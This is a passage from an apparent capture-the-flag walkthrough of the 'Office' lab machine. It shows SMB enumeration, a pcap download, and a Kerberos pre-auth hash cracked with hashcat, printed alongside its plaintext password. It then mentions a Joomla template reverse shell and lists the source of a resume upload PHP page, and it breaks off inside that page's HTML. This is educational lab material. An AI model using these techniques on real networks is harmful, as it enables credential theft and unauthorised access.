<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient &#39;\\10.10.11.3\SOC Analysis&#39; -U dwolfe -L
</span></span><span style="display:flex;"><span>Password for [WORKGROUP\dwolfe]:
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                   D        0  Wed May 10 13:52:24 2023
</span></span><span style="display:flex;"><span>  ..                                DHS        0  Wed Feb 14 04:18:31 2024
</span></span><span style="display:flex;"><span>  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 19:59:00 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		6265599 blocks of size 4096. 1193500 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; get Latest-System-Dump-8fbc124d.pcap
</span></span><span style="display:flex;"><span>getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (387.6 KiloBytes/sec) (average 387.6 KiloBytes/sec)
</span></span><span style="display:flex;"><span>smb: \&gt; exit
</span></span></code></pre></div><p>Let&rsquo;s analyze the pcap file using wireshark.</p>
</li>
<li>
<p><strong>PCap Analysis</strong></p>
<p><img src="images/wireshark.png" alt="pcap analysis"></p>
<p><img src="images/kerberos.png" alt="alt text"></p>
</li>
<li>
<p><strong>ASREQRoast - Cracking Pre-Auth Timestamp</strong></p>
<p>After analyzing the pcap file I found two <code>AS-REQ</code>. In a typical kerberos setup the the pre-auth feature is enabled by default. If it is enabled we cannot perform <code>ASREPRoast</code> attack. But it opens another vector for an attack. In kerberos when pre-auth is enabled the client encrypts the current timestamp with it&rsquo;s own password as an encryption key. So, if the password is weak enough we can obtain it using <code>hashcat</code> by trying to decrypt the <code>cipher</code> which is shown in the figure. Here the etype is <code>18</code>. So the mode for hashcat would be <code>19900</code>. Which depicts Pre-Auth in hashcat&rsquo;s documentation.</p>
<p>Also I discovered the <code>cname</code> object contained <code>cname-string: tstark</code> this is the user sending the request. So the user is <code>tstark@office.htb</code>. Now let&rsquo;s construct the hash for hashcat.</p>
</li>
<li>
<p><strong>Hashcat</strong></p>
<p>Hash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
</span></span></code></pre></div><p>Cracked</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
</span></span></code></pre></div></li>
</ul>
<h2 id="foothold">Foothold</h2>
<p>I tried the cracked password against the AD but didn&rsquo;t work. But it worked against Joomla Admin Dashboard. Let&rsquo;s try to get a reverse shell on Joomla Dashboard using templates. I got a shell of the <code>web_account</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;whoami
</span></span><span style="display:flex;"><span>office\web_account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
</span></span></code></pre></div><p>The <code>htdocs</code> folder contained anothe directory named <code>internal</code> besides <code>joomla</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/24/2024  05:08 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          administrator
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          internal
</span></span><span style="display:flex;"><span>04/30/2024  07:15 AM    &lt;DIR&gt;          joomla
</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,044,477,952 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs&gt;
</span></span></code></pre></div><p>One file seemed interesting inside the internal directory. It was <code>resume.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\internal&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs\internal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>02/14/2024  06:35 PM    &lt;DIR&gt;          applications
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          css
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          img
</span></span><span style="display:flex;"><span>01/30/2024  09:38 AM             5,113 index.html
</span></span><span style="display:flex;"><span>01/30/2024  09:40 AM             5,282 resume.php
</span></span><span style="display:flex;"><span>               2 File(s)         10,395 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,038,227,456 bytes free
</span></span></code></pre></div><p><strong>resume.php</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>?php
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">$</span>notifi <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">$</span>_SERVER[<span style="color:#f1fa8c">&#34;REQUEST_METHOD&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span> ){
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>stdname<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;fullname&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>email<span style="color:#ff79c6">=</span>str_replace(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;email&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>experience<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;experience&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>salary<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;salary&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>department<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;department&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>rewritefn <span style="color:#ff79c6">=</span> strtolower(str_replace(<span style="color:#f1fa8c">&#39; &#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#f1fa8c">&#34;$stdname-$department-$salary $experience $email&#34;</span>));
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filename <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetype<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;type&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;size&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;error&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetmp <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>  chmod(<span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>], <span style="color:#bd93f9">0664</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span> onigiri <span style="color:#ff79c6">in</span> <span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>ext <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#ff79c6">$</span>filename);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span>last piece of data from array
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>extension <span style="color:#ff79c6">=</span> strtolower(end(<span style="color:#ff79c6">$</span>ext));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesallowed <span style="color:#ff79c6">=</span> array(<span style="color:#f1fa8c">&#39;docm&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;odt&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">if</span>(in_array(<span style="color:#ff79c6">$</span>extension,<span style="color:#ff79c6">$</span>filesallowed)){
</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>){
</span></span><span style="display:flex;"><span>       <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">5242880</span>){
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>ff <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;$rewritefn.$extension&#34;</span>;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>loc <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;applications/&#34;</span><span style="color:#ff79c6">.$</span>ff;
</span></span><span style="display:flex;"><span>	   <span style="color:#ff79c6">if</span>(move_uploaded_file(<span style="color:#ff79c6">$</span>filetmp,<span style="color:#ff79c6">$</span>loc))
</span></span><span style="display:flex;"><span>	   {
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">//</span> upload successful
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;</span>
</span></span><span style="display:flex;"><span>	       button, input , select, option, h3{
</span></span><span style="display:flex;"><span>			display:none;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	       <span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#34;;</span>
</span></span><span style="display:flex;"><span>	 } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>echo <span style="color:#ff79c6">$</span>loc;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✖️  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>	 }
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>       } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>	 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;⚠️  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>     } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;✖️  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>   } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>?<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>DOCTYPE html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;shortcut icon&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Resume Submission<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>style type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text/css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>body{
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">100</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>overflow:auto;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi{
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi hr{
</span></span><span style="display:flex;"><span>background:<span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">2</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic{
</span></span><span style="display:flex;"><span>margin<span style="color:#ff79c6">-</span>top:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>height:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>width:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>border: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef{
</span></span><span style="display:flex;"><span>border<span style="color:#ff79c6">-</span>bottom: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>size:<span style="color:#bd93f9">14</span>px;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inputstyle ,<span style="color:#ff79c6">.</span>inpstyles {
</span></span><span style="display:flex;"><span>width:<span style="color:#bd93f9">69</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">35</span>px;
</span></span><span style="display:flex;"><span>border:<span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::<span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>file<span style="color:#ff79c6">-</span>upload<span style="color:#ff79c6">-</span>button {
</span></span><span style="display:flex;"><span>  visibility: hidden;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::before {
</span></span><span style="display:flex;"><span>  content: <span style="color:#f1fa8c">&#39;  &#39;</span>;
</span></span><span style="display:flex;"><span>  display: inline<span style="color:#ff79c6">-</span>block;
</span></span><span style="display:flex;"><span>  border: <span style="color:#bd93f9">1</span>px solid <span style="color:#6272a4">#999;</span>
</span></span><span style="display:flex;"><span>  border<span style="color:#ff79c6">-</span>radius: <span style="color:#bd93f9">3</span>px;
</span></span><span style="display:flex;"><span>  padding: <span style="color:#bd93f9">5</span>px <span style="color:#bd93f9">8</span>px;
</span></span><span style="display:flex;"><span>  outline: none;
</span></span><span style="display:flex;"><span>  white<span style="color:#ff79c6">-</span>space: nowrap;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>select: none;
</span></span><span style="display:flex;"><span>  cursor: pointer;
</span></span><span style="display:flex;"><span>  text<span style="color:#ff79c6">-</span>shadow: <span style="color:#bd93f9">1</span>px <span style="color:#bd93f9">1</span>px <span style="color:#6272a4">#fff;</span>
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>weight: <span style="color:#bd93f9">700</span>;
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>size: <span style="color:#bd93f9">10</span>pt;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>::placeholder{
</span></span><span style="display:flex;"><span>color:<span style="color:#6272a4">#151715;</span>
</span></span><span style="display:flex;"><span>opacity:<span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic h3{
</span></span><span style="display:flex;"><span>    text<span style="color:#ff79c6">-</span>align: left;
</span></span><span style="display:flex;"><span>    padding<span style="color:#ff79c6">-</span>left: <span style="color:#bd93f9">260</span>px;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;magic&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span> Job Application Submission<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>hr style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:inherit;padding:0px;height:2px; background:#000000&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notifi&#34;</span><span style="color:#ff79c6">&gt;&lt;</span>?php echo <span style="color:#f1fa8c">&#34;$notifi&#34;</span>; ?<span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>form action<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> method<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> enctype<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Full Name:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fullname&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Example : John Doe&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Email:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34; Example : xxx123@xyz.abc&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Work Experience<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span>  <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;experience&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">20</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">30</span> years<span style="color:#ff79c6">&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;/</span>select<span style="color:#ff79c6">&gt;&lt;</span>br<span style="color:#ff79c6">/&gt;</span>      
</span></span><span style="display:flex;"><span>	  <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Requested Salary<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>select id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyles&#34;</span> style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;background:#151715; color:#ffffff; font-weight:bold&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;salary&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;30 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">30</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;60 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">60</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">&lt;</span>option value<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;80 000&#34;</span> <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inpstyl&#34;</span><span style="color:#ff79c6">&gt;</span><span style="color:#bd93f9">80</span> <span style="color:#bd93f9">000</span><span style="color:#ff79c6">$&lt;/</span>option<span style="color:#ff79c6">&gt;</span>
